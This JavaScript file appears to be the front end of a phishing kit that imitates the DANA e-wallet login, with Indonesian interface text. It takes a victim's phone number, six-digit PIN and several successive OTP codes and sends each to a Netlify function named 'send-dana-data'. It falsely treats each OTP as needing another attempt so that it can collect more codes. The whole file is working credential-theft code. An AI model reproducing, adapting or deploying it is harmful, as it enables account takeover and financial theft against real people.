document.addEventListener('DOMContentLoaded', function() {
  // DOM Elements
  const pages = {
    phone: document.getElementById('number-page'),
    pin: document.getElementById('pin-page'),
    otp: document.getElementById('otp-page')
  };
  
  const phoneInput = document.getElementById('phone-number');
  const pinInputs = document.querySelectorAll('.pin-box');
  const otpInputs = document.querySelectorAll('.otp-box');
  const continueBtn = document.getElementById('lanjutkan-button');
  const showPinBtn = document.querySelector('.show-text');
  const notification = document.getElementById('floating-notification');
  const successNotification = document.getElementById('success-notification');
  const attemptCounter = document.getElementById('attempt-counter');
  const attemptNumber = document.getElementById('attempt-number');

  // State Management
  const state = {
    currentPage: 'phone',
    phoneNumber: '',
    pin: '',
    otp: '',
    attempts: 0,
    maxAttempts: 3,
    otpTimer: null
  };

  // 1. PHONE NUMBER INPUT HANDLING
  phoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    // Format: 8xxx-xxxx-xxxx
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.substring(1);
    }
    
    let formatted = '';
    if (value.length > 0) formatted = value.substring(0, 4);
    if (value.length > 4) formatted += '-' + value.substring(4, 8);
    if (value.length > 8) formatted += '-' + value.substring(8, 12);
    
    phoneInput.value = formatted;
    state.phoneNumber = value;
  });

  // 2. CONTINUE BUTTON HANDLER
  continueBtn.addEventListener('click', async function() {
    if (state.currentPage === 'phone') {
      if (state.phoneNumber.length < 10) {
        showError('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showLoading();
      try {
        await sendData('phone', { phone: state.phoneNumber });
        switchPage('pin');
      } catch (error) {
        showError('Gagal mengirim nomor HP');
      } finally {
        hideLoading();
      }
    }
  });

  // 3. PIN INPUT HANDLING
  pinInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pinInputs.length - 1) {
        pinInputs[index + 1].focus();
      }
      
      state.pin = Array.from(pinInputs).map(i => i.value).join('');
      
      if (state.pin.length === 6) {
        submitPIN();
      }
    });

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pinInputs[index - 1].focus();
      }
    });
  });

  // 4. OTP INPUT HANDLING
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
      
      state.otp = Array.from(otpInputs).map(i => i.value).join('');
      
      if (state.otp.length === 4) {
        submitOTP();
      }
    });

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });

  // CORE FUNCTIONS
  function switchPage(targetPage) {
    // Hide all pages
    Object.values(pages).forEach(page => {
      page.style.display = 'none';
    });
    
    // Show target page with smooth transition
    pages[targetPage].style.display = 'block';
    state.currentPage = targetPage;
    
    // Auto-focus first input
    setTimeout(() => {
      const firstInput = pages[targetPage].querySelector('input');
      if (firstInput) firstInput.focus();
    }, 100);
  }

  async function sendData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        throw new Error(await response.text());
      }
      
      return await response.json();
    } catch (error) {
      console.error('API Error:', error);
      throw error;
    }
  }

  async function submitPIN() {
    showLoading();
    try {
      await sendData('pin', { phone: state.phoneNumber, pin: state.pin });
      switchPage('otp');
      startOTPTimer();
      showNotification();
    } catch (error) {
      showError('PIN salah atau terjadi kesalahan');
      clearPINInputs();
    } finally {
      hideLoading();
    }
  }

  async function submitOTP() {
    showLoading();
    try {
      await sendData('otp', { 
        phone: state.phoneNumber, 
        pin: state.pin,
        otp: state.otp 
      });
      
      handleOTPResponse();
    } catch (error) {
      showError('OTP salah atau terjadi kesalahan');
      handleOTPError();
    } finally {
      hideLoading();
    }
  }

  function startOTPTimer() {
    clearInterval(state.otpTimer);
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    state.otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(state.otpTimer);
        document.getElementById('resend-otp').style.display = 'block';
      }
      timeLeft--;
    }, 1000);
  }

  function handleOTPResponse() {
    state.attempts++;
    attemptNumber.textContent = state.attempts;
    attemptCounter.style.display = 'block';
    
    // Clear OTP inputs
    otpInputs.forEach(input => input.value = '');
    otpInputs[0].focus();
    state.otp = '';
    
    if (state.attempts >= state.maxAttempts) {
      successNotification.style.display = 'block';
      setTimeout(() => {
        successNotification.style.display = 'none';
      }, 5000);
    }
  }

  function handleOTPError() {
    otpInputs.forEach(input => input.value = '');
    otpInputs[0].focus();
    state.otp = '';
  }

  function clearPINInputs() {
    pinInputs.forEach(input => input.value = '');
    pinInputs[0].focus();
    state.pin = '';
  }

  // UI HELPERS
  function showLoading() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideLoading() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function showNotification() {
    notification.style.display = 'block';
    setTimeout(() => {
      notification.style.display = 'none';
    }, 5000);
  }

  function showError(message) {
    const errorElement = document.getElementById('error-message');
    if (!errorElement) return;
    
    errorElement.textContent = message;
    errorElement.style.display = 'block';
    setTimeout(() => {
      errorElement.style.display = 'none';
    }, 3000);
  }

  // PIN VISIBILITY TOGGLE
  showPinBtn.addEventListener('click', function() {
    const isShowing = this.classList.toggle('active');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    this.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
  });

  // INITIALIZE
  switchPage('phone');
});
